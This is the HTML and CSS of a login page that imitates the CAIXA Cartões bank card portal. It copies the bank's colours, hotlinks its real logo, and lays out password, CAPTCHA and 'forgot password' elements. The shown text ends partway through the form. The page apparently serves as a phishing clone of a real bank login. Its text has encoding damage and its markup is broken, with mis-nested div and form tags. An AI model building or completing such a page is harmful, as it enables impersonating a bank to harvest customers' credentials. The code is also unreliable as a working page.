<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - CAIXA Cart√µes</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --caixa-blue: #00529D;
            --caixa-orange: #FF8C00;
            --white: #FFFFFF;
            --input-border: rgba(255, 255, 255, 0.6);
            --font-main: 'Roboto', sans-serif;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body, html {
            height: 100%;
            font-family: var(--font-main);
            background-color: var(--caixa-blue);
            color: var(--white);
            overflow-x: hidden;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 80px);
            padding: 20px;
        }

        /* 2. Cabe√ßalho de Logotipos */
        .logo-header {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 40px;
        }

        .logo-header img {
            height: 45px;
        }

        .separator-v {
            width: 1px;
            height: 35px;
            background-color: rgba(255, 255, 255, 0.5);
        }

        /* 3. Formul√°rio */
        .login-form {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        .input-group label {
            display: block;
            font-size: 0.9rem;
            margin-bottom: 5px;
            font-weight: 300;
        }

        .input-group input {
            width: 100%;
            background: transparent;
            border: none;
            border-bottom: 1px solid var(--white);
            color: var(--white);
            padding: 10px 0;
            font-size: 1rem;
            outline: none;
            transition: border-bottom 0.3s;
        }

        .input-group input:focus {
            border-bottom: 2.5px solid var(--white);
        }

        .forgot-pass {
            color: var(--white);
            text-decoration: underline;
            font-size: 0.75rem;
            align-self: flex-start;
            margin-top: -15px;
            margin-bottom: 25px;
            cursor: pointer;
        }

        /* CAPTCHA */
        .captcha-container {
            background: var(--white);
            display: flex;
            align-items: center;
            padding: 5px 10px;
            border-radius: 4px;
            margin-bottom: 25px;
            height: 50px;
        }

        .captcha-input {
            border: none !important;
            color: #333 !important;
            border-bottom: 1px solid #ccc !important;
            width: 80px !important;
            margin-right: 10px;
            padding: 5px !important;
        }

        .captcha-img {
            height: 35px;
            flex-grow: 1;
            object-fit: contain;
        }

        .refresh-icon {
            cursor: pointer;
            margin-left: 10px;
            filter: invert(1); /* Faz o √≠cone preto ficar branco fora do container se necess√°rio, mas aqui usaremos azul ou cinza */
            color: var(--caixa-blue);
            font-size: 1.2rem;
        }

        /* Bot√µes */
        .btn-entrar {
            background-color: var(--caixa-orange);
            color: var(--white);
            border: none;
            padding: 14px;
            border-radius: 6px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: opacity 0.3s;
            margin-bottom: 15px;
        }

        .btn-entrar:hover {
            opacity: 0.9;
        }

        .register-area {
            text-align: center;
            margin-top: 10px;
        }

        .register-area p {
            font-size: 0.8rem;
            margin-bottom: 10px;
        }

        .btn-outline {
            background: transparent;
            border: 1px solid var(--white);
            color: var(--white);
            padding: 12px;
            border-radius: 6px;
            width: 100%;
            cursor: pointer;
            font-weight: 500;
            transition: background 0.3s;
        }

        .btn-outline:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        /* 5. Rodap√© */
        footer {
            width: 100%;
            padding: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            font-size: 0.75rem;
            position: relative;
        }

        .footer-info p {
            margin-bottom: 5px;
            max-width: 600px;
            line-height: 1.4;
        }

        .footer-logo img {
            height: 40px;
        }

        /* Responsividade */
        @media (max-width: 600px) {
            footer {
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            .footer-logo {
                margin-top: 20px;
            }
            .logo-header img {
                height: 35px;
            }
        }
    </style>
</head>
<body>

    <main class="main-container">
        <div class="logo-header">
            <img src="https://minhacontatag.caixaprepagos.com.br/caixa/assets/logo.png" alt="CAIXA Cart√µes">
            <div class="separator-v"></div>
            <img src="." alt="tagCAIXA">

        <form class="login-form" id="loginForm">

            </div>

            <div class="input-group">

                <input type="password" id="password" required>
